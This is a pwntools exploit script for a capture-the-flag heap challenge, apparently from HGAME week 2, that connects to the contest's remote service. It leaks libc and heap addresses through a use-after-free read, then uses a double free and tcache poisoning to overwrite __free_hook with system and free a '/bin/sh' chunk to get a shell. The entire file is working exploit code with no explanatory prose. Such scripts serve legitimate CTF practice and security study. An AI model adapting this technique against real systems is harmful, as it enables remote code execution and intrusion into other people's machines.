from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

# sh = process(["./vuln.hgame"])
sh = remote("week-2.hgame.lwsec.cn", 31648)
elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")
# libc = ELF("/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")


def add(idx: int, size: int, content: bytes):
    sh.sendlineafter(b'4. Exit', b'1')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendlineafter(b'Size: ', str(size).encode())
    sh.sendafter(b'Content: ', content)


def delete(idx: int):
    sh.sendlineafter(b'4. Exit', b'2')
    sh.sendlineafter(b'Index: ', str(idx).encode())


def show(idx: int):
    sh.sendlineafter(b'4. Exit', b'3')
    sh.sendlineafter(b'Index: ', str(idx).encode())

for i in range(10):
    add(i, 0x80, b'A\n')

for i in range(7):
    delete(i)

delete(8)
show(8)

# gdb.attach(sh)
# pause()

libc_base = u64(sh.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - 0x1ecbe0
print(hex(libc_base))
show(1)
heap_base = u64(sh.recvuntil(b'\n', drop=True).ljust(8, b'\x00')) - 0x2a0
print(hex(heap_base))

delete(7)
add(10, 0x80, b'B\n')
delete(8)

add(11, 0xF0, b'\x00'*0x80+p64(0)+p64(0x91)+p64(libc_base + libc.sym['__free_hook'])+p64(0))
add(12, 0x80, b'/bin/sh\x00')
add(13, 0x80, p64(libc_base + libc.sym['system']))
delete(12)

sh.interactive()